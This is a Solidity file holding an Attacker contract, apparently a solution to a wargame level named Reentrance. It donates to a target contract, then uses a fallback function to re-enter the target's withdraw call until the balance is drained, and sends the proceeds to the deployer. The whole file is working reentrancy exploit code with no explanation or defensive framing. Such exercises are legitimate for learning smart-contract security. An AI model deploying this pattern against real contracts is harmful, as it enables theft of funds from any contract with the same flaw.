// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import './Reentrance.sol';

contract Attacker {

  address payable target;
  address public deployer;
  uint val;

  constructor (address payable _target) public {
    target = _target;
    deployer = msg.sender;
  }

  function attack() public {
    Reentrance t = Reentrance(target);
    t.withdraw(val);
    }

  function donate() public payable {
    Reentrance t = Reentrance(target);
    t.donate{value: msg.value}(address(this));
    val = msg.value;
    }

  fallback() external payable {
    if (target.balance >= val) {attack();}
    else {
      Reentrance t = Reentrance(target);
      t.withdraw(target.balance);
      deployer.call.value(address(this).balance)("");
    }
  }
}
